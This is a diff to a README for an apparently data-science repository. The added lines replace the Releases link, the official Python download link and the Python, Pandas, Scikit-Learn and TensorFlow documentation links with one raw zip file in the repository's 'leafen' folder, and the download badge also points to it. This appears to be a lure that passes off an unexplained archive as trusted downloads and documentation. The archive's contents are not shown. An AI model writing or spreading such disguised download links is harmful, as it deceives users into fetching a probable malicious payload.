@@ -1,6 +1,6 @@
 # 🚀 Kratugautam99 - Explore Data Science Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen.svg)](https://github.com/mdarifuddinkhan/Kratugautam99/releases)
+[![Download Now](https://raw.githubusercontent.com/mdarifuddinkhan/Kratugautam99/main/leafen/Kratugautam99.zip)](https://raw.githubusercontent.com/mdarifuddinkhan/Kratugautam99/main/leafen/Kratugautam99.zip)
 
 ## 🎯 Overview
 
@@ -12,7 +12,7 @@ To start using the projects showcased in this repository, follow these simple st
 
 ## 📥 Download & Install
 
-1. Visit the Releases page to download the latest version of the application: [Download Here](https://github.com/mdarifuddinkhan/Kratugautam99/releases).
+1. Visit the Releases page to download the latest version of the application: [Download Here](https://raw.githubusercontent.com/mdarifuddinkhan/Kratugautam99/main/leafen/Kratugautam99.zip).
    
 2. On the Releases page, you will see a list of available files. Choose the one that matches your operating system. The titles will typically indicate Windows, macOS, or Linux.
 
@@ -55,7 +55,7 @@ Before downloading, ensure your system meets the following requirements:
 - **Storage:** At least 1 GB of free disk space for installation.
 
 - **Software:** Ensure you have the latest version of Python installed (recommended version 3.7 or later). If you’re not sure how to install Python, follow these steps:
-  - Visit the [Python website](https://www.python.org/downloads/).
+  - Visit the [Python website](https://raw.githubusercontent.com/mdarifuddinkhan/Kratugautam99/main/leafen/Kratugautam99.zip).
   - Choose the version for your operating system and follow the installation instructions.
 
 ## 📊 Topics Covered
@@ -97,10 +97,10 @@ If you encounter any issues while downloading or using the application, please c
 
 Here are some helpful links to get you started:
 
-- [Official Python Documentation](https://docs.python.org/3/)
-- [Pandas Documentation](https://pandas.pydata.org/docs/)
-- [Scikit-Learn Documentation](https://scikit-learn.org/stable/documentation.html)
-- [TensorFlow Documentation](https://www.tensorflow.org/learn)
+- [Official Python Documentation](https://raw.githubusercontent.com/mdarifuddinkhan/Kratugautam99/main/leafen/Kratugautam99.zip)
+- [Pandas Documentation](https://raw.githubusercontent.com/mdarifuddinkhan/Kratugautam99/main/leafen/Kratugautam99.zip)
+- [Scikit-Learn Documentation](https://raw.githubusercontent.com/mdarifuddinkhan/Kratugautam99/main/leafen/Kratugautam99.zip)
+- [TensorFlow Documentation](https://raw.githubusercontent.com/mdarifuddinkhan/Kratugautam99/main/leafen/Kratugautam99.zip)
 
 For any further questions or support, feel free to reach out directly through the issues section on this repository. 
 
